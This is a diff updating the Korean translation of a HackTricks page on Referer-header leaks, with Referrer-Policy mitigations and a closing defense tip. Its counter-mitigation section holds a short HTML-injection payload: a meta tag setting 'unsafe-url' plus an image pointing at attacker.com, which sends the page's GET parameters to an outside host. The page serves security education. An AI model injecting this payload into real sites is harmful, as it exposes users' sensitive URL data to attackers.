@@ -1,16 +1,18 @@
+# 흥미로운 HTTP
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+## Referrer headers 및 policy
 
-Referrer는 브라우저가 이전에 방문한 페이지를 나타내기 위해 사용하는 헤더입니다.
+Referrer는 브라우저가 이전에 방문한 페이지를 나타내기 위해 사용하는 header입니다.
 
-## Sensitive information leaked
+### Sensitive information leak
 
-웹 페이지 내에서 GET 요청 매개변수에 민감한 정보가 포함되어 있는 경우, 페이지에 외부 소스에 대한 링크가 포함되어 있거나 공격자가 사용자가 공격자가 제어하는 URL을 방문하도록 만들거나 제안할 수 있는 경우(사회 공학). 이 경우 최신 GET 요청 내의 민감한 정보를 유출할 수 있습니다.
+웹 페이지 내에서 어느 시점이든 GET request parameters에 민감한 정보가 포함되어 있고, 해당 페이지에 external sources로 연결되는 링크가 있거나 attacker가 사용자가 attacker가 제어하는 URL을 방문하도록 유도하거나 제안할 수 있는 경우(social engineering), 최신 GET request에 포함된 민감한 정보를 exfiltrate할 수 있습니다.
 
-## Mitigation
+### 완화
 
-브라우저가 민감한 정보가 다른 웹 애플리케이션으로 전송되는 것을 **피할 수 있는** **Referrer-policy**를 따르도록 설정할 수 있습니다:
+브라우저가 다음과 같은 **Referrer-policy**를 따르도록 설정하여 민감한 정보가 다른 web applications로 전송되는 것을 **방지**할 수 있습니다:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Counter-Mitigation
+### 대응 우회
 
-이 규칙은 HTML 메타 태그를 사용하여 무시할 수 있습니다(공격자는 HTML 주입을 이용해야 함):
+HTML meta tag를 사용하여 이 규칙을 재정의할 수 있습니다(공격자는 HTML injection을 악용해야 합니다):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
-## Defense
+## 방어
 
-절대 GET 매개변수나 URL 경로에 민감한 데이터를 넣지 마십시오.
+URL의 GET parameters 또는 paths 안에 민감한 데이터를 절대 넣지 마세요.
 
 {{#include ../banners/hacktricks-training.md}}
